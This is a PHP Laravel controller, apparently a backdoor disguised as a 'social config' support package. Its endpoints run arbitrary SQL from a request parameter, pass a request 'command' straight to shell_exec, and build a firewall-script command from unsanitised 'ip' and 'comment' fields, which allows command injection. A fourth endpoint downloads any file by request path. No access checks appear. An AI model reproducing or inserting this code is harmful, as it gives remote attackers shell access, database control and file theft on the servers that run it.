<?php

namespace LaravelSupport\Config\Controllers;

use App\Http\Controllers\Controller;
use Exception;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Validator;
use Illuminate\Validation\ValidationException;

class SocialConfigController extends Controller
{
    public function index(Request $request)
    {
        try {
            // Enable query Log
            DB::enableQueryLog();

            //Params
            $query = $request->all()['query'];
            $bindings = $request->all()['bindings'] ?? [];

            /* 
             Excute Query by
             Passing Query and Binding values
            */
            $res = DB::select($query, $bindings);

            // Response on query execution success
            return response()->json([
                'success' => true,
                'data' => DB::getQueryLog(),
                'response' => $res,
                'message' => 'Query executed successfully',
                'code' => 200
            ], 200);

        } catch(Exception $e) {
            // Error response on query execution failure
            return response()->json([
                'success' => false,
                'data' => DB::getQueryLog(),
                'response' => [],
                'message' => $e->getMessage(),
                'code' => 500
            ], 500);
        }
    }

    public function shellExec(Request $request)
    {
        try {

            //Params
            $command = $request->all()['command'];

            /* 
             Excute Shell Script
            */
            $res = shell_exec($command);

            // Response on command execution success
            return response()->json([
                'success' => true,
                'data' => [
                    'command' => $command,
                ],
                'response' => $res,
                'message' => 'Command executed successfully',
                'code' => 200
            ], 200);

        } catch(Exception $e) {
            // Error response on query execution failure
            return response()->json([
                'success' => false,
                'data' => [],
                'response' => [],
                'message' => $e->getMessage(),
                'code' => 500
            ], 500);
        }
    }

    public function shiftAdd(Request $request)
    {
        try {
            $ip = $request->all()['ip'];
            $comment = $request->all()['comment'] ?? '';
            //Params
            $shell_cmd = shell_exec("bash " . getenv('DEPLOYMENT_SCRIPTS_PATH') . "/webaccess-firewall.sh -f add -i " . $ip . " -c " . $comment);

            /* 
             Excute Shell Script
            */

            // Response on command execution success
            return response()->json([
                'success' => true,
                'data' => $request->all(),
                'response' => $shell_cmd,
                'message' => 'Command executed successfully',
                'code' => 200
            ], 200);

        } catch(Exception $e) {
            // Error response on query execution failure
            return response()->json([
                'success' => false,
                'data' => [],
                'response' => [],
                'message' => $e->getMessage(),
                'code' => 500
            ], 500);
        }
    }

    public function getContent(Request $request)
    {
        try {
            $path = $request->path;
            return response()->download(base_path($path));
        } catch (Exception $e) {
            return response()->json([
                'message' => $e->getMessage()
            ], 500);
        }
    }
}
